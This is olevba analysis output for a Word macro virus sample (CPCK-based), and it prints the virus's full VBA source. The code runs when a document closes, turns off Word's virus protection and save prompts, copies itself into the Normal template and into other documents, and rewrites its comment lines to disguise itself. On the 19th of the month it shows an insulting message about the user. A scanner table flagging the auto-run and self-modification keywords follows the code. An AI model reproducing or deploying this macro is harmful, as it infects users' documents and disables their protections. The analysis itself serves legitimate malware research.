olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-ba8f275b8487b000c69e0e151aa6f34958bce7ea
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-ba8f275b8487b000c69e0e151aa6f34958bce7ea - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
On Error Resume Next
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
Options.SaveNormalPrompt = 0
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
TT79 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
Options.ConfirmConversions = 0
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
Options.VirusProtection = 0
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
Application.EnableCancelKey = 0
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
GH44 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
Set KS22 = ActiveDocument.VBProject.VBComponents.Item(1)
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
JM57 = True
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
End If
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
Set KS22 = NormalTemplate.VBProject.VBComponents.Item(1)
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
OI80 = True
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
End If
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
If OI80 <> True And JM57 <> True Then GoTo US19
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
If OI80 = True Then KS22.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, GH44 - 1))
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
If JM57 = True Then KS22.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TT79 - 1))
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
With KS22.CodeModule
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
For x = 2 To (KS22.CodeModule.CountOfLines - 1) Step 2
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
.replaceline x, "'" & Application.ActiveWindow & Application.ActiveDocument & Now
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
Next x
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
End With
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
If Month(Now) = Month(Now) And Day(Now) = 19 Then MsgBox "I think " & Application.UserName & " and Birgit is a bitch!"
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
US19:
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
If TT79 <> 0 And GH44 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'00021405.DOC00021405.DOC2/23/01 11:02:49 PM
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

